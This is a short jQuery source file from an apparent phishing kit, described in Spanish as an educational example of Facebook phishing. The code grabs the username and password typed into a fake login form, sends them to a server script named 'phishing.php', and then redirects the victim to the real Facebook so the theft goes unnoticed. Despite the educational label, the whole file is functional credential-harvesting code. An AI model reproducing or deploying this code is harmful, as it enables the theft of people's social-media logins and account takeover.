/**
 * Aplicación que sirve como ejemplo educativo de como se realiza
 * phishing en Facebook, para obtener la información de los usuarios
 * @author, Steelheart93
 * @version 2.2
 */

$(function () {
    $("#capturar").click(function () {
        var usuario = document.getElementById("user").value;
        var password = document.getElementById("pass").value;

        var promesa = $.get("php/phishing.php", { "user": usuario, "pass": password });

        promesa.done(function (respuesta) {
            console.log("done: " + respuesta);
            location = "https://www.facebook.com/";
        });

        promesa.fail(function (respuesta) {
            console.log("fail: " + respuesta);
        });
    });
});